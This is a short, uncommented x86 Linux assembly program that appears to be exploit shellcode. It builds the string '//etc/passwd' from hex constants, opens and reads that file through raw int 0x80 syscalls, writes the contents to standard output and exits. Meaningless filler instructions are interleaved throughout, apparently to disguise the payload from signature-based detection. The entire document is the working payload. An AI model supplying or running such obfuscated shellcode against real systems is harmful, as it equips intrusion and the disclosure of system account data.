global _start

section .text

_start:

	lahf
	cmc
	xor eax, eax
	xor ebx, ebx
	push eax
	pop ecx
	cdq
	mov al,0x5
	push ecx
	mov dword [esp-4], 0x64777373
	mov dword [esp-8], 0x61702f63
	mov dword [esp-12], 0x74652f2f
	sub esp, 12
	mov ebx, esp
	int 0x80
	
	push eax
	push ebx
	push ecx
	pop eax
	pop ecx
	pop ebx
	xor eax, eax
	mov al, 0x3
	mov dx, 0xfff
	inc edx
	int 0x80

	push eax
	push edx
	pop eax
	pop edx
	xor eax, eax
	mov al, 0x4
	mov bl, 0x1
	int 0x80

	xchg eax,ebx
	int 0x80

